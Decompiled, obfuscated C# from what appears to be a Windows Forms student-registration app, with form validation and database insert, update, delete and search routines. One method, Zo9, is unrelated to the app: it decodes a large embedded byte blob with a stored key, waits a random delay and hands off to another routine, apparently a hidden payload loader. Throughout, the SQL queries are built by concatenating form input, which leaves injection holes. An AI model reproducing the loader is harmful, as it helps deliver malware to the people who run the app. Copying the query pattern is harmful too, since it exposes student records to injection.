using System;
using System.Drawing;
using System.Threading.Tasks;
using System.Windows.Forms;
using Hr60;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Xi1;
using Yk7;
using Yw6;
using k9X;
using q3G;
using t8C;
using w0M;
using y3E;

namespace Gt7;

[StandardModule]
internal sealed class s4L
{
	private static object e = true;

	private static DateTime timeof = DateAndTime.get_TimeOfDay();

	private static DateTime todayday = Conversions.ToDate(Strings.Format((object)"yyyy-mmm-dd", Conversions.ToString(DateAndTime.get_Today())));

	public static void b0B()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtSurname.get_Text(), "Enter Surname", false) == 0)
		{
			Ng2.Forms.Stundentform.txtSurname.set_Text("");
			((TextBoxBase)Ng2.Forms.Stundentform.txtSurname).set_ForeColor(Color.Black);
		}
	}

	public static void b6T()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtSurname.get_Text(), "", false) == 0)
		{
			Ng2.Forms.Stundentform.txtSurname.set_Text("Enter Surname");
			((TextBoxBase)Ng2.Forms.Stundentform.txtSurname).set_ForeColor(Color.Gray);
		}
	}

	public static void Bn6()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtFname.get_Text(), "Enter Name", false) == 0)
		{
			Ng2.Forms.Stundentform.txtFname.set_Text("");
			((TextBoxBase)Ng2.Forms.Stundentform.txtFname).set_ForeColor(Color.Black);
		}
	}

	public static void Ee1()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtFname.get_Text(), "", false) == 0)
		{
			Ng2.Forms.Stundentform.txtFname.set_Text("Enter Name");
			((TextBoxBase)Ng2.Forms.Stundentform.txtFname).set_ForeColor(Color.Gray);
		}
	}

	public static void Rt4()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtNational.get_Text(), "Enter Nationality", false) == 0)
		{
			Ng2.Forms.Stundentform.txtNational.set_Text("");
			((TextBoxBase)Ng2.Forms.Stundentform.txtNational).set_ForeColor(Color.Black);
		}
	}

	public static void Rn8()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtNational.get_Text(), "", false) == 0)
		{
			Ng2.Forms.Stundentform.txtNational.set_Text("Enter Nationality");
			((TextBoxBase)Ng2.Forms.Stundentform.txtNational).set_ForeColor(Color.Gray);
		}
	}

	public static void m2D()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtGuid.get_Text(), "Enter Guidence", false) == 0)
		{
			Ng2.Forms.Stundentform.txtGuid.set_Text("");
			((TextBoxBase)Ng2.Forms.Stundentform.txtGuid).set_ForeColor(Color.Black);
		}
	}

	public static void Lf2()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtGuid.get_Text(), "", false) == 0)
		{
			Ng2.Forms.Stundentform.txtGuid.set_Text("Enter Guidence");
			((TextBoxBase)Ng2.Forms.Stundentform.txtGuid).set_ForeColor(Color.Gray);
		}
	}

	public static void s0K()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtPhone.get_Text(), "Enter Phone Number", false) == 0)
		{
			Ng2.Forms.Stundentform.txtPhone.set_Text("");
			((TextBoxBase)Ng2.Forms.Stundentform.txtPhone).set_ForeColor(Color.Black);
		}
	}

	public static void a1Z()
	{
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtPhone.get_Text(), "", false) == 0)
		{
			Ng2.Forms.Stundentform.txtPhone.set_Text("Enter Phone Number");
			((TextBoxBase)Ng2.Forms.Stundentform.txtPhone).set_ForeColor(Color.Gray);
		}
	}

	public static void Gy9()
	{
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_014f: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0361: Unknown result type (might be due to invalid IL or missing references)
		//IL_03af: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtFname.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Name is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtSurname.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Surname is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtAddress.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Address is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtNational.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Nationality is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtFname.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Guidance's name is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Ng2.Forms.Stundentform.txtPhone.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Phone Number is Required!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Ng2.Forms.Stundentform.cmbClass.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please select class!", (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(Ng2.Forms.Stundentform.cmbGender.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)"Please select gender!", (MsgBoxStyle)0, (object)null);
			return;
		}
		Xe9.issucess = y8T.f3E("INSERT INTO `student_details` (`stid`, `name`, `surname`,`dateOfBirth`,  `gender`, `nationality`, `class`,  `address`, `guidanceName`, `phone`,`date_registered`)  VALUES ('" + Ng2.Forms.Stundentform.txtReg.get_Text() + "','" + Ng2.Forms.Stundentform.txtFname.get_Text() + "', '" + Ng2.Forms.Stundentform.txtSurname.get_Text() + "', '" + Conversions.ToString(Ng2.Forms.Stundentform.DOBPick.get_Value()) + "', '" + Ng2.Forms.Stundentform.cmbGender.get_Text() + "', '" + Ng2.Forms.Stundentform.txtNational.get_Text() + "',  '" + Ng2.Forms.Stundentform.cmbClass.get_Text() + "',  '" + Ng2.Forms.Stundentform.txtAddress.get_Text() + "','" + Ng2.Forms.Stundentform.txtGuid.get_Text() + "', '" + Ng2.Forms.Stundentform.txtPhone.get_Text() + "',  '" + Conversions.ToString(todayday) + "');");
		if (Xe9.issucess)
		{
			Interaction.MsgBox((object)"Student has been registered successfully!", (MsgBoxStyle)64, (object)null);
			((Control)Ng2.Forms.StudentList).Show();
			((Form)Ng2.Forms.StudentList).set_Location(new Point(433, 122));
			((Control)Ng2.Forms.Stundentform).Hide();
		}
		else
		{
			Interaction.MsgBox((object)"No student has been registered!", (MsgBoxStyle)16, (object)null);
		}
	}

	internal static void Zo9()
	{
		byte[] array = Af4.o0A(133632);
		checked
		{
			int mg = Conversions.ToInteger(t0S8.mDic[t0S8.sNum]) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Sj2.n2R(array[i], (byte[])t0S8.mDic[t0S8.sArray], mg, i);
			}
			t0S8.mDic.Add(t0S8.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			Yd3.Px6();
		}
	}

	public static void c9W()
	{
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			j5J.Cn2("SELECT Max(stid) From `student_details`  ");
			Xe9.con.k4F();
			int num = Xe9.cmd.ExecuteScalar;
			Ng2.Forms.Stundentform.txtReg.set_Text(Conversions.ToString(checked(num + 1)));
			if (Operators.CompareString(Ng2.Forms.Stundentform.txtReg.get_Text(), "", false) == 0)
			{
				Ng2.Forms.Stundentform.txtReg.set_Text("");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		Xe9.con.Xb4();
	}

	public static void b5M()
	{
		//IL_0039: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			j5J.Cn2("SELECT stid,name,surname,dateOfBirth,gender,nationality,class,address,guidanceName,phone FROM student_details");
			Fr0.t0C(Ng2.Forms.StudentList.StudentGridView, "studentList");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Xe9.con.Xb4();
			Xe9.da.Ns5();
		}
	}

	public static void a2S()
	{
		Ng2.Forms.StudentList.txtReg.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(0)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.txtFname.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(1)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.txtSurname.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(2)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.DOBPick.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(3)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.cmbGender.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(4)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.txtNational.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(5)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.cmbClass.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(6)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.txtAddress.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(7)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.txtGuid.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(8)
			.get_Value()
			.ToString());
		Ng2.Forms.StudentList.txtPhone.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(9)
			.get_Value()
			.ToString());
	}

	public static void t8M()
	{
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		Xe9.issucess = y8T.f3E("UPDATE `student_details` SET `name`='" + Ng2.Forms.StudentList.txtFname.get_Text() + "',`surname`= '" + Ng2.Forms.StudentList.txtSurname.get_Text() + "',`dateOfBirth`='" + Conversions.ToString(Ng2.Forms.StudentList.DOBPick.get_Value()) + "' ,`gender`= '" + Ng2.Forms.StudentList.cmbGender.get_Text() + "' ,`nationality`= '" + Ng2.Forms.StudentList.txtNational.get_Text() + "',`class`= '" + Ng2.Forms.StudentList.cmbClass.get_Text() + "',`address`= '" + Ng2.Forms.StudentList.txtAddress.get_Text() + "',`guidanceName`='" + Ng2.Forms.StudentList.txtGuid.get_Text() + "',`phone`='" + Ng2.Forms.StudentList.txtPhone.get_Text() + "' WHERE `stid`='" + Ng2.Forms.StudentList.txtReg.get_Text() + "'");
		if (Xe9.issucess)
		{
			Interaction.MsgBox((object)"Student has been Successfully!Updated a student", (MsgBoxStyle)64, (object)null);
			b5M();
			Kp8();
		}
		else
		{
			Interaction.MsgBox((object)"Error occured..................!!!", (MsgBoxStyle)16, (object)null);
		}
	}

	public static void Kp8()
	{
		((TextBoxBase)Ng2.Forms.StudentList.txtReg).Clear();
		((TextBoxBase)Ng2.Forms.StudentList.txtFname).Clear();
		((TextBoxBase)Ng2.Forms.StudentList.txtSurname).Clear();
		((Control)Ng2.Forms.StudentList.DOBPick).ResetText();
		Ng2.Forms.StudentList.cmbGender.ResetText();
		((TextBoxBase)Ng2.Forms.StudentList.txtNational).Clear();
		Ng2.Forms.StudentList.cmbClass.ResetText();
		((TextBoxBase)Ng2.Forms.StudentList.txtAddress).Clear();
		((TextBoxBase)Ng2.Forms.StudentList.txtGuid).Clear();
		((TextBoxBase)Ng2.Forms.StudentList.txtPhone).Clear();
	}

	public static void p8J()
	{
		//IL_026a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			j5J.Cn2("SELECT stid,name,surname,dateOfBirth,gender,nationality,class,address,guidanceName,phone FROM student_details WHERE class = '" + Ng2.Forms.StudentList.cmbFilterClass.get_Text() + "'");
			Fr0.t0C(Ng2.Forms.StudentList.StudentGridView, "studentList");
			j5J.Cn2("SELECT count(*) FROM `student_details`where class ='" + Ng2.Forms.StudentList.cmbFilterClass.get_Text() + "'");
			int num = Yd3.r1X();
			Ng2.Forms.StudentList.lbTotal.set_Text(Conversions.ToString(num));
			((Control)Ng2.Forms.StudentList.Panel11).set_Visible(true);
			Ng2.Forms.StudentList.lblClassName.set_Text(Ng2.Forms.StudentList.cmbFilterClass.get_Text());
			if (Conversions.ToDouble(Ng2.Forms.StudentList.lbTotal.get_Text()) > 1.0)
			{
				Ng2.Forms.StudentList.lblDesicion.set_Text("ther are");
				Ng2.Forms.StudentList.LabelBelow.set_Text("Pupils in this Class");
				((Control)Ng2.Forms.StudentList.lbTotal).set_Visible(true);
				((Control)Ng2.Forms.StudentList.LabelBelow).set_Visible(true);
			}
			else if (Conversions.ToDouble(Ng2.Forms.StudentList.lbTotal.get_Text()) == 1.0)
			{
				Ng2.Forms.StudentList.lblDesicion.set_Text("there is");
				Ng2.Forms.StudentList.LabelBelow.set_Text("Pupil in this Class");
				((Control)Ng2.Forms.StudentList.lbTotal).set_Visible(true);
				((Control)Ng2.Forms.StudentList.LabelBelow).set_Visible(true);
			}
			else if (Conversions.ToDouble(Ng2.Forms.StudentList.lbTotal.get_Text()) == 0.0)
			{
				Ng2.Forms.StudentList.lblDesicion.set_Text("THE CLASS IS EMPTY");
				((Control)Ng2.Forms.StudentList.lbTotal).set_Visible(false);
				((Control)Ng2.Forms.StudentList.LabelBelow).set_Visible(false);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Xe9.con.Xb4();
			Xe9.da.Ns5();
		}
	}

	public static void i5C()
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		Xe9.issucess = y8T.i2A("DELETE FROM student_details  WHERE `stid`='" + Ng2.Forms.StudentList.txtReg.get_Text() + "'");
		if (Xe9.issucess)
		{
			Interaction.MsgBox((object)"Student has been Deleted successfully!", (MsgBoxStyle)64, (object)null);
			b5M();
			Kp8();
		}
		else
		{
			Interaction.MsgBox((object)"Error occured..................!!!", (MsgBoxStyle)16, (object)null);
		}
	}

	public static void b4F()
	{
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			j5J.Cn2("SELECT * FROM `student_details` WHERE `stid`='" + Ng2.Forms.StudentList.txtSearch.get_Text() + "'");
			Xe9.con.k4F();
			Xe9.dReader = Xe9.cmd.ExecuteReader;
			while (Xe9.dReader.Kb8())
			{
				Ng2.Forms.StudentList.txtSearch.set_Text("");
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.Message, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		finally
		{
			Xe9.con.Xb4();
			Xe9.da.Ns5();
		}
	}

	public static void q2L()
	{
		j5J.Cn2("SELECT count(*) FROM `student_details`");
		int num = Yd3.r1X();
		Ng2.Forms.StudentList.lblTotal.set_Text(Conversions.ToString(num));
	}

	public static void Dw4()
	{
		j5J.Cn2("SELECT count(*) FROM `student_details` where gender ='Female'");
		int num = Yd3.r1X();
		Ng2.Forms.StudentList.lblTotalFemale.set_Text(Conversions.ToString(num));
	}

	public static void f1R()
	{
		j5J.Cn2("SELECT count(*) FROM `student_details` where gender ='Male'");
		int num = Yd3.r1X();
		Ng2.Forms.StudentList.lblTotalMale.set_Text(Conversions.ToString(num));
	}

	public static void Wr9()
	{
		((Control)Ng2.Forms.Student_Profile).Show();
		((Form)Ng2.Forms.Student_Profile).set_Location(new Point(290, 114));
		((Control)Ng2.Forms.StudentList).Hide();
		Ng2.Forms.Student_Profile.lblReg.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(0)
			.get_Value()
			.ToString());
		Ng2.Forms.Student_Profile.lblFname.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(1)
			.get_Value()
			.ToString());
		Ng2.Forms.Student_Profile.lblSurn.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(2)
			.get_Value()
			.ToString());
		Ng2.Forms.Student_Profile.lblGnder.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(4)
			.get_Value()
			.ToString());
		Ng2.Forms.Student_Profile.lblClass.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(6)
			.get_Value()
			.ToString());
		Ng2.Forms.Student_Profile.lblphone.set_Text(Ng2.Forms.StudentList.StudentGridView.get_CurrentRow().get_Cells().get_Item(9)
			.get_Value()
			.ToString());
	}
}
